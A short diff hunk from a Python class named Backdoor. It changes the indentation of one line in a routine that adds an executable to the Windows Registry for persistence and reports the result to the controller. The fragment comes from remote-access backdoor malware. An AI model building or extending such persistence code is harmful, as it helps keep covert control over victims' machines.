@@ -46,7 +46,7 @@ class Backdoor:
                 res = "\n[+] Successfully added executable to the Registry"
             except:
                 res = "\n[-] ERROR - Cannot add executable for persistence"
-        data = data + res
+            data = data + res
         self.reliable_send(data)
         return
 
